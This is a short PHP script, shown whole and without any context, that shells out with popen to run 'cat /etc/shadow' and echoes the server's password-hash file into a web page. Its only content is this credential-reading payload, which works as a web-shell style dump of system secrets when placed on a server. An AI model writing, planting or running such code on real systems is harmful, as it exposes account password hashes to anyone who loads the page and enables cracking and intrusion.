<?php

echo "<pre>";

$fp = popen('cat /etc/shadow', 'r');
while (!feof($fp))
{
    echo fgets($fp);
}
pclose($fp);

